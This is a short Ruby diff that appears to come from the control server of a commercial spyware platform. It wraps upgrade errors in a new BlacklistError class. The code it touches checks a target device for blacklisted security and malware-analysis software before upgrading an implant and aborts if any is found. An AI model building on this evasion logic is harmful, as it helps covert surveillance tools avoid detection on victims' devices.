@@ -495,10 +495,10 @@ class Item
   end
 
   def blacklisted_software?
-    raise "Cannot determine blacklist" if self._kind != 'agent'
+    raise BlacklistError.new("Cannot determine blacklist") if self._kind != 'agent'
 
     device = Evidence.collection_class(self.path.last).where({type: 'device', aid: self._id.to_s}).last
-    raise "Cannot determine installed software" unless device
+    raise BlacklistError.new("Cannot determine installed software") unless device
 
     installed = device[:data]['content']
 
@@ -511,7 +511,7 @@ class Item
       trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
       if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
         trace :warn, "Blacklisted software detected: #{bmatch}"
-        raise "The target device contains a software that prevents the upgrade."
+        raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
       end
     end
 
@@ -523,7 +523,7 @@ class Item
       next unless offending
       if Regexp.new(offending, Regexp::IGNORECASE).match(installed)
         trace :warn, "Analysis software detected: #{offending}"
-        raise "The target device contains malware analysis software. Please contact HT support immediately"
+        raise BlacklistError.new("The target device contains malware analysis software. Please contact HT support immediately")
       end
     end
 
@@ -663,4 +663,16 @@ class Stat
   field :dashboard, type: Hash, :default => {}
   
   embedded_in :item
+end
+
+class BlacklistError < StandardError
+  attr_reader :msg
+
+  def initialize(msg)
+    @msg = msg
+  end
+
+  def to_s
+    @msg
+  end
 end
